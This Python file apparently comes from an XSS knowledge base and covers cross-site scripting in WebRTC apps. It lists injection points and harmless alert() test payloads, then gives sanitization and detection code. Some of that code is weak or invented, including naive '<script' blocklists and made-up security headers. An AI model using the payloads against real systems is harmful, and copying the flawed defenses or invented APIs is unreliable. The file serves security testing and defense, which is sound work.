#!/usr/bin/env python3

"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easyprotech)
Dev: Brabus
Date: Sat 25 Oct 2025 12:00:00 UTC
Status: Created
Telegram: https://t.me/easyprotech

Knowledge Base: WebRTC XSS Context - Comprehensive Guide
"""

DETAILS = {
    "title": "Cross-Site Scripting (XSS) in WebRTC Context",
    # Metadata for SIEM/Triage Integration
    "severity": "high",
    "cvss_score": 7.6,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
    "reliability": "certain",
    "cwe": ["CWE-79"],
    "owasp": ["A03:2021"],
    "tags": ["xss", "webrtc", "p2p", "media-injection", "real-time"],
    "description": """
WebRTC XSS occurs when user input is reflected into WebRTC data channels, media streams, or
signaling messages without proper sanitization. WebRTC (Web Real-Time Communication) enables
peer-to-peer communication between browsers, including video, audio, and data exchange.
When malicious content is injected into WebRTC communications, it can lead to code execution
across all participants in a call or session.

VULNERABILITY CONTEXT:
WebRTC XSS typically happens when:
1. Usernames/display names are transmitted in signaling
2. Chat messages in data channels are not sanitized
3. Media metadata contains malicious content
4. Session descriptions are manipulated
5. ICE candidates are injected with scripts
6. Data channel messages are reflected

Common in:
- Video conferencing applications (Zoom, Teams, WebEx)
- Peer-to-peer chat applications
- Online gaming platforms
- Collaborative workspaces
- Customer support tools
- Educational platforms
- Social video platforms
- Telemedicine applications

SEVERITY: HIGH
WebRTC XSS allows real-time code execution across multiple participants simultaneously.
The peer-to-peer nature makes it difficult to detect and prevent, and attacks can spread
rapidly through video calls and conferences.
""",
    "attack_vector": """
WEBRTC XSS ATTACK VECTORS:

1. SIGNALING MESSAGE INJECTION:
   Server relays signaling data:
   socket.emit('signal', {
     type: 'offer',
     from: USER_INPUT,  // Username injection
     data: sdpData
   });

   Attack payload:
   <script>alert('WebRTC XSS')</script>

2. DATA CHANNEL MESSAGE INJECTION:
   WebRTC data channel:
   dataChannel.send(JSON.stringify({
     type: 'chat',
     message: USER_INPUT,  // Chat message
     timestamp: Date.now()
   }));

   Attack payload:
   <script>alert(1)</script>

3. USERNAME/DISPLAY NAME INJECTION:
   Peer connection setup:
   pc.createOffer().then(function(offer) {
     return pc.setLocalDescription(offer);
   }).then(function() {
     socket.emit('signal', {
       user: '<script>alert(1)</script>',  // Injected username
       data: pc.localDescription
     });
   });

4. ROOM NAME INJECTION:
   Join room functionality:
   socket.emit('join_room', {
     room: USER_INPUT,  // Room name
     user: username
   });

   Attack payload:
   <img src=x onerror=alert(1)>

5. SESSION DESCRIPTION INJECTION:
   SDP (Session Description Protocol) manipulation:
   const sdp = 'v=0\\r\\n' +
               'o=- ' + USER_INPUT + ' IN IP4 192.168.1.1\\r\\n' +  // Origin line injection
               's=WebRTC Session\\r\\n';

6. ICE CANDIDATE INJECTION:
   ICE (Interactive Connectivity Establishment):
   pc.onicecandidate = function(event) {
     if (event.candidate) {
       socket.emit('ice', {
         candidate: event.candidate.candidate,
         user: USER_INPUT  // User data in ICE
       });
     }
   });

ADVANCED WEBRTC XSS TECHNIQUES:

7. MEDIA TRACK INJECTION:
   Adding malicious media tracks:
   const maliciousStream = new MediaStream();
   maliciousStream.addTrack(maliciousTrack);

   pc.addTrack(maliciousTrack, maliciousStream);

8. DATA CHANNEL PROTOCOL CONFUSION:
   Sending HTML as data:
   dataChannel.send('<script>alert(1)</script>');

   Receiving end interprets as HTML:
   const message = JSON.parse(dataChannelData);
   document.body.innerHTML = message.content;  // XSS execution

9. SDP PARAMETER INJECTION:
   Malformed SDP with XSS:
   const maliciousSDP = 'v=0\\r\\n' +
                       'o=<script>alert(1)</script> 123456 123456 IN IP4 0.0.0.0\\r\\n' +
                       's=WebRTC\\r\\n' +
                       'c=IN IP4 0.0.0.0\\r\\n';

10. RTC PEER CONNECTION HIJACKING:
    Intercepting and modifying peer connections:
    const originalCreateOffer = RTCPeerConnection.prototype.createOffer;
    RTCPeerConnection.prototype.createOffer = function() {
      return originalCreateOffer.apply(this, arguments).then(function(offer) {
        offer.sdp = offer.sdp.replace(/o=.*/, 'o=<script>alert(1)</script>');
        return offer;
      });
    };

11. MEDIA CONSTRAINTS INJECTION:
    Media constraints with XSS:
    const constraints = {
      audio: true,
      video: {
        width: 1280,
        height: 720,
        frameRate: 30,
        deviceId: USER_INPUT  // Device ID injection
      }
    };

12. STUN/TURN SERVER INJECTION:
    ICE server configuration:
    const configuration = {
      iceServers: [{
        urls: 'stun:stun.l.google.com:19302'
      }, {
        urls: 'turn:turn.server.com',
        username: USER_INPUT,  // Username injection
        credential: 'password'
      }]
    };

13. DATA CHANNEL LABEL INJECTION:
    Creating data channels with malicious labels:
    const dataChannel = pc.createDataChannel('<script>alert(1)</script>');

14. PEER IDENTITY INJECTION:
    WebRTC identity assertion:
    pc.setIdentityProvider('identity.example.com', {
      user: USER_INPUT  // Identity injection
    });

15. MEDIA CAPABILITIES INJECTION:
    Media capabilities with XSS:
    navigator.mediaCapabilities.decodingInfo({
      type: 'file',
      audio: {contentType: 'audio/webm'},
      video: {contentType: 'video/webm'}
    }).then(function(result) {
      socket.emit('media_info', {
        capabilities: result,
        user: USER_INPUT  // User data injection
      });
    });

WEBRTC-SPECIFIC BYPASSES:

16. BINARY DATA CHANNEL ATTACK:
    Sending binary data interpreted as HTML:
    const binaryData = new TextEncoder().encode('<script>alert(1)</script>');
    dataChannel.send(binaryData);

17. COMPRESSION ATTACK:
    Compressed data channel content:
    dataChannel.binaryType = 'arraybuffer';
    const compressed = pako.deflate('<script>alert(1)</script>');
    dataChannel.send(compressed);

18. FRAGMENTED MESSAGE ATTACK:
    Splitting XSS across multiple data channel messages:
    dataChannel.send('<scr');
    dataChannel.send('ipt>alert(1)</scr');
    dataChannel.send('ipt>');

19. MULTIPLEXING ATTACK:
    Multiple data channels with coordinated attack:
    chatChannel.send('Start attack');
    xssChannel.send('<script>alert(1)</script>');

20. DTLS FINGERPRINT SPOOFING:
    Fake DTLS certificates with XSS:
    const fakeFingerprint = 'XX:XX:XX:<script>alert(1)</script>:XX:XX:XX';

REAL-WORLD ATTACK SCENARIOS:

21. VIDEO CONFERENCING ATTACK:
    - Zoom/Teams style application
    - Attendee name: <script>alert(1)</script>
    - Displayed in participant list
    - All participants see script execution
    - Credential theft from all attendees

22. PEER-TO-PEER CHAT:
    - Direct messaging between users
    - Message: <script>stealSession()</script>
    - Executes on recipient's browser
    - Session hijacking

23. ONLINE GAMING:
    - Player communication in game
    - Player action: <script>alert(1)</script>
    - Affects all players in session
    - Game state manipulation

24. CUSTOMER SUPPORT:
    - Screen sharing with chat
    - Support message: <script>alert(1)</script>
    - Executes on customer browser
    - Information disclosure

25. EDUCATIONAL PLATFORM:
    - Virtual classroom
    - Student name: <script>alert(1)</script>
    - Affects teacher and all students
    - Session disruption

26. TELEMEDICINE:
    - Doctor-patient consultation
    - Patient info: <script>alert(1)</script>
    - Medical data theft

27. COLLABORATIVE WORKSPACE:
    - Shared document editing
    - Comment: <script>alert(1)</script>
    - Real-time execution across all editors

WEBRTC XSS DETECTION:

28. MANUAL TESTING:
    - Browser DevTools WebRTC inspection
    - Monitor signaling messages
    - Test data channel communication
    - Check media stream metadata

29. AUTOMATED SCANNING:
    - WebRTC connection interception
    - Payload injection in data channels
    - Signaling message manipulation
    - Media stream analysis

30. PROXY MONITORING:
    - WebRTC traffic interception
    - Message content analysis
    - Connection pattern monitoring
""",
    "remediation": """
WEBRTC XSS DEFENSE STRATEGY:

1. SIGNALING MESSAGE SANITIZATION (PRIMARY DEFENSE):
   Sanitize all signaling messages:

   Node.js signaling server:
   const DOMPurify = require('dompurify');
   const cleanUserData = DOMPurify.sanitize(userInput);

   Python signaling server:
   import bleach
   clean_message = bleach.clean(message, tags=[], strip=True)

2. DATA CHANNEL CONTENT VALIDATION:
   Validate data channel messages:

   JavaScript validation:
   dataChannel.onmessage = function(event) {
     const data = event.data;

     if (isValidDataChannelMessage(data)) {
       processMessage(data);
     } else {
       console.warn('Invalid data channel message blocked');
     }
   };

   function isValidDataChannelMessage(data) {
     // Strict validation
     return typeof data === 'string' &&
            data.length < 1000 &&
            !data.includes('<script') &&
            !data.includes('javascript:');
   }

3. USERNAME/DISPLAY NAME SANITIZATION:
   Sanitize user identifiers:

   function sanitizeUsername(username) {
     return username
       .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
       .replace(/<[^>]*>/g, '')
       .substring(0, 50);  // Length limit
   }

4. SDP CONTENT VALIDATION:
   Validate Session Description Protocol:

   function validateSDP(sdp) {
     const dangerousPatterns = [
       /<script/i,
       /javascript:/i,
       /vbscript:/i,
       /onload=/i,
       /onerror=/i
     ];

     for (const pattern of dangerousPatterns) {
       if (pattern.test(sdp)) {
         throw new Error('Invalid SDP content');
       }
     }

     return sdp;
   }

5. ICE CANDIDATE VALIDATION:
   Validate ICE candidates:

   function validateICECandidate(candidate) {
     const cleanCandidate = candidate
       .replace(/<[^>]*>/g, '')
       .replace(/javascript:/gi, '')
       .replace(/vbscript:/gi, '');

     return cleanCandidate;
   }

6. MEDIA TRACK VALIDATION:
   Validate media tracks and streams:

   function validateMediaStream(stream) {
     const tracks = stream.getTracks();

     for (const track of tracks) {
       const settings = track.getSettings();

       // Validate track labels and IDs
       if (settings.deviceId && settings.deviceId.includes('<script')) {
         track.stop();
         throw new Error('Invalid media track');
       }
     }

     return stream;
   }

7. PEER CONNECTION SECURITY:
   Secure peer connection configuration:

   const configuration = {
     iceServers: [
       {urls: 'stun:stun.l.google.com:19302'}
     ],
     iceTransportPolicy: 'all',  // or 'relay' for maximum security
     bundlePolicy: 'balanced',
     rtcpMuxPolicy: 'require'
   };

8. DATA CHANNEL RESTRICTIONS:
   Implement data channel security:

   const dataChannel = pc.createDataChannel('chat', {
     ordered: true,
     maxPacketLifeTime: 3000
   });

   // Set up message filtering
   dataChannel.onmessage = function(event) {
     if (typeof event.data === 'string') {
       const cleanMessage = DOMPurify.sanitize(event.data);
       displayMessage(cleanMessage);
     }
   };

9. ORIGIN VALIDATION:
   Validate WebRTC connection origins:

   pc.onconnectionstatechange = function() {
     if (pc.connectionState === 'connected') {
       // Validate remote peer identity
       pc.getIdentityAssertion().then(function(assertion) {
         if (!isValidPeer(assertion)) {
           pc.close();
         }
       });
     }
   };

10. MESSAGE SIZE LIMITS:
    Implement message size restrictions:

    const MAX_MESSAGE_SIZE = 4096;

    dataChannel.onmessage = function(event) {
      if (event.data.length > MAX_MESSAGE_SIZE) {
        console.warn('Message too large, blocked');
        return;
      }

      processMessage(event.data);
    };

11. RATE LIMITING:
    Implement WebRTC rate limiting:

    let messageCount = 0;
    const MESSAGE_LIMIT = 10;
    const TIME_WINDOW = 10000;  // 10 seconds

    setInterval(() => {
      if (messageCount > MESSAGE_LIMIT) {
        pc.close();
      }
      messageCount = 0;
    }, TIME_WINDOW);

12. CSP FOR WEBRTC:
    Content Security Policy:

    Content-Security-Policy:
      default-src 'self';
      script-src 'self' 'nonce-{random}';
      media-src 'self' blob: data:;
      connect-src 'self' wss: ws:;
      object-src 'none';

13. WEBRTC FEATURE DETECTION:
    Feature detection and graceful degradation:

    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      // Fallback to non-WebRTC communication
      useAlternativeCommunication();
    }

14. LOGGING AND MONITORING:
    Comprehensive WebRTC logging:

    pc.oniceconnectionstatechange = function() {
      logger.info('ICE connection state:', pc.iceConnectionState, {
        userId: currentUser.id,
        timestamp: new Date().toISOString()
      });
    };

    dataChannel.onmessage = function(event) {
      logger.debug('Data channel message', {
        length: event.data.length,
        type: typeof event.data,
        userId: currentUser.id
      });
    };

15. ERROR HANDLING:
    Proper error handling:

    pc.onerror = function(error) {
      logger.error('WebRTC error', {
        error: error.message,
        userId: currentUser.id
      });

      // Don't expose error details to users
      showGenericError();
    };

16. REGULAR SECURITY TESTING:
    WebRTC-specific testing:

    Automated tests:
    - WebRTC connection establishment
    - Data channel message validation
    - Signaling security testing
    - Media stream security testing

    Manual tests:
    - Browser DevTools WebRTC inspection
    - Network tab monitoring
    - Data channel message inspection

SECURITY TESTING PAYLOADS:

Basic WebRTC XSS:
<script>alert('WebRTC XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

Data channel payloads:
{"type": "chat", "message": "<script>alert(1)</script>"}
{"user": "<script>alert(1)</script>", "message": "Hello"}

Signaling payloads:
{"type": "join", "user": "<script>alert(1)</script>"}
{"type": "offer", "from": "<img src=x onerror=alert(1)>"}

Advanced payloads:
data:text/html,<script>alert(1)</script>
javascript:alert(1)
vbscript:msgbox(1)

WEBRTC SECURITY HEADERS:

Sec-WebRTC-Fingerprint: (DTLS fingerprint)
Sec-WebRTC-Key: (encrypted key)
Content-Security-Policy: media-src 'self'

MONITORING METRICS:

Monitor for:
- Unusual data channel message patterns
- Signaling message anomalies
- Media track manipulation attempts
- Peer connection failures
- Rate limiting violations

OWASP REFERENCES:
- OWASP WebRTC Cheat Sheet
- OWASP Testing Guide: Testing WebRTC
- WebRTC Security Considerations
- RFC 8825: WebRTC Security
""",
}
